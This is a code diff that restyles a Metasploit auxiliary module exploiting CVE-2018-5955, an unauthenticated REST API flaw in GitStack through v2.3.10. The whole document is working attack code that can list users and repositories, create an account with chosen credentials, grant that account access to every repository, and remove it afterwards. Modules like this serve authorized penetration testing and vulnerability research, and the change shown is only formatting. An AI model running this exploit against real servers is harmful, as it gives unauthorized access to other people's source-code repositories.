@@ -8,45 +8,44 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'         => 'GitStack Unauthenticated REST API Requests',
-      'Description'  => %q{
-        This modules exploits unauthenticated REST API requests in GitStack through v2.3.10.
-        The module supports requests for listing users of the application and listing
-        available repositories. Additionally, the module can create a user and add the user
-        to the application's repositories. This module has been tested against GitStack v2.3.10.
-      },
-      'Author'       =>
-        [
-          'Kacper Szurek',  # Vulnerability discovery and PoC
-          'Jacob Robles'    # Metasploit module
+    super(
+      update_info(
+        info,
+        'Name' => 'GitStack Unauthenticated REST API Requests',
+        'Description' => %q{
+          This modules exploits unauthenticated REST API requests in GitStack through v2.3.10.
+          The module supports requests for listing users of the application and listing
+          available repositories. Additionally, the module can create a user and add the user
+          to the application's repositories. This module has been tested against GitStack v2.3.10.
+        },
+        'Author' => [
+          'Kacper Szurek', # Vulnerability discovery and PoC
+          'Jacob Robles' # Metasploit module
         ],
-      'License'      => MSF_LICENSE,
-      'References'   =>
-        [
+        'License' => MSF_LICENSE,
+        'References' => [
           ['CVE', '2018-5955'],
           ['EDB', '43777'],
           ['EDB', '44044']
         ],
-      'DisclosureDate' => '2018-01-15',
-      'Actions'       =>
-        [
+        'DisclosureDate' => '2018-01-15',
+        'Actions' => [
           [
             'LIST',
             {
               'Description' => 'List application users',
-              'List'      => 'GET',
-              'UserPath'    => '/rest/user/'
+              'List' => 'GET',
+              'UserPath' => '/rest/user/'
             }
           ],
           [
             'CREATE',
             {
               'Description' => 'Create a user on the application',
-              'Create'      => 'POST',
-              'List'        => 'GET',
-              'UserPath'    => '/rest/user/',
-              'RepoPath'    => '/rest/repository/'
+              'Create' => 'POST',
+              'List' => 'GET',
+              'UserPath' => '/rest/user/',
+              'RepoPath' => '/rest/repository/'
             }
           ],
           # If this is uncommented, you will be able to change an
@@ -55,50 +54,53 @@ class MetasploitModule < Msf::Auxiliary
           # added to all available repositories.
           # The cleanup action removes the user from all repositories
           # and then deletes the user... so this action may not be desirable.
-          #[
-            #'MODIFY',
-            #{
-              #'Description' => "Change the application user's password",
-              #'Create'      => 'PUT',
-              #'List'        => 'GET',
-              #'UserPath'    => '/rest/user/',
-              #'RepoPath'    => '/rest/repository/'
-            #}
-          #],
+          # [
+          # 'MODIFY',
+          # {
+          # 'Description' => "Change the application user's password",
+          # 'Create'      => 'PUT',
+          # 'List'        => 'GET',
+          # 'UserPath'    => '/rest/user/',
+          # 'RepoPath'    => '/rest/repository/'
+          # }
+          # ],
           [
             'LIST_REPOS',
             {
               'Description' => 'List available repositories',
-              'List'      => 'GET',
-              'RepoPath'    => '/rest/repository/'
+              'List' => 'GET',
+              'RepoPath' => '/rest/repository/'
             }
           ],
           [
             'CLEANUP',
             {
               'Description' => 'Remove user from repositories and delete user',
-              'List'        => 'GET',
-              'Remove'      => 'DELETE',
-              'RepoPath'    => '/rest/repository/',
-              'UserPath'    => '/rest/user/'
+              'List' => 'GET',
+              'Remove' => 'DELETE',
+              'RepoPath' => '/rest/repository/',
+              'UserPath' => '/rest/user/'
             }
           ]
         ],
-      'DefaultAction' => 'LIST'))
+        'DefaultAction' => 'LIST'
+      )
+    )
 
     register_options(
       [
         OptString.new('USERNAME', [false, 'User to create or modify', 'msf']),
         OptString.new('PASSWORD', [false, 'Password for user', 'password'])
-      ])
+      ]
+    )
   end
 
   def get_users
     path = action.opts['UserPath']
     begin
       res = send_request_cgi({
-        'uri'     =>  path,
-        'method'  =>  action.opts['List']
+        'uri' => path,
+        'method' => action.opts['List']
       })
     rescue Rex::ConnectionError, Errno::ECONNRESET => e
       print_error("Failed: #{e.class} - #{e.message}")
@@ -113,7 +115,7 @@ class MetasploitModule < Msf::Auxiliary
         return
       end
       mylist.each do |item|
-        print_good("#{item}")
+        print_good(item.to_s)
       end
     end
   end
@@ -122,8 +124,8 @@ class MetasploitModule < Msf::Auxiliary
     path = action.opts['RepoPath']
     begin
       res = send_request_cgi({
-        'uri'     =>  path,
-        'method'  =>  action.opts['List']
+        'uri' => path,
+        'method' => action.opts['List']
       })
     rescue Rex::ConnectionError, Errno::ECONNRESET => e
       print_error("Failed: #{e.class} - #{e.message}")
@@ -145,7 +147,7 @@ class MetasploitModule < Msf::Auxiliary
   def clean_app
     user = datastore['USERNAME']
     unless user
-      print_error("USERNAME required")
+      print_error('USERNAME required')
       return
     end
 
@@ -156,8 +158,8 @@ class MetasploitModule < Msf::Auxiliary
         path = "#{action.opts['RepoPath']}#{item['name']}/user/#{user}/"
         begin
           res = send_request_cgi({
-            'uri'     =>  path,
-            'method'  =>  action.opts['Remove']
+            'uri' => path,
+            'method' => action.opts['Remove']
           })
         rescue Rex::ConnectionError, Errno::ECONNRESET => e
           print_error("Failed: #{e.class} - #{e.message}")
@@ -165,7 +167,7 @@ class MetasploitModule < Msf::Auxiliary
         end
 
         if res && res.code == 200
-          print_good("#{res.body}")
+          print_good(res.body.to_s)
         else
           print_status("User #{user} doesn't have access to #{item['name']}")
         end
@@ -176,8 +178,8 @@ class MetasploitModule < Msf::Auxiliary
     path = "#{action.opts['UserPath']}#{user}/"
     begin
       res = send_request_cgi({
-        'uri'     =>  path,
-        'method'  =>  action.opts['Remove']
+        'uri' => path,
+        'method' => action.opts['Remove']
       })
     rescue Rex::ConnectionError, Errno::ECONNRESET => e
       print_error("Failed: #{e.class} - #{e.message}")
@@ -186,9 +188,9 @@ class MetasploitModule < Msf::Auxiliary
 
     # Check if the account was successfully deleted
     if res && res.code == 200
-      print_good("#{res.body}")
+      print_good(res.body.to_s)
     else
-      print_error("#{res.body}")
+      print_error(res.body.to_s)
     end
   end
 
@@ -198,11 +200,11 @@ class MetasploitModule < Msf::Auxiliary
 
     begin
       res = send_request_cgi({
-        'uri'       =>  action.opts['UserPath'],
-        'method'    =>  action.opts['Create'],
-        'vars_post' =>  {
-          'username'  =>  user,
-          'password'  =>  pass
+        'uri' => action.opts['UserPath'],
+        'method' => action.opts['Create'],
+        'vars_post' => {
+          'username' => user,
+          'password' => pass
         }
       })
     rescue Rex::ConnectionError, Errno::ECONNRESET => e
@@ -212,7 +214,7 @@ class MetasploitModule < Msf::Auxiliary
     if res && res.code == 200
       print_good("SUCCESS: #{user}:#{pass}")
     else
-      print_error("#{res.body}")
+      print_error(res.body.to_s)
       return
     end
 
@@ -222,45 +224,45 @@ class MetasploitModule < Msf::Auxiliary
         path = "#{action.opts['RepoPath']}#{item['name']}/user/#{user}/"
         begin
           res = send_request_cgi({
-            'uri'     =>  path,
-            'method'  =>  action.opts['Create']
+            'uri' => path,
+            'method' => action.opts['Create']
           })
         rescue Rex::ConnectionError, Errno::ECONNRESET => e
           print_error("Failed: #{e.class} - #{e.message}")
           next
         end
         if res && res.code == 200
-          print_good("#{res.body}")
+          print_good(res.body.to_s)
         else
-          print_error("Failed to add user")
-          print_error("#{res.body}")
+          print_error('Failed to add user')
+          print_error(res.body.to_s)
         end
       end
     else
-      print_error("Failed to retrieve repository list")
+      print_error('Failed to retrieve repository list')
     end
   end
 
   def run
-    if ["LIST"].include?(action.name)
+    if ['LIST'].include?(action.name)
       print_status('Retrieving Users')
       get_users
-    elsif ["LIST_REPOS"].include?(action.name)
+    elsif ['LIST_REPOS'].include?(action.name)
       print_status('Retrieving Repositories')
       mylist = get_repos
       if mylist
         mylist.each do |item|
-          print_good("#{item['name']}")
+          print_good((item['name']).to_s)
         end
       else
-        print_error("Failed to retrieve repository list")
+        print_error('Failed to retrieve repository list')
       end
-    elsif ["CLEANUP"].include?(action.name)
+    elsif ['CLEANUP'].include?(action.name)
       clean_app
     elsif datastore['USERNAME'] && datastore['PASSWORD']
       add_user
     else
-      print_error("USERNAME and PASSWORD required")
+      print_error('USERNAME and PASSWORD required')
     end
   end
 end
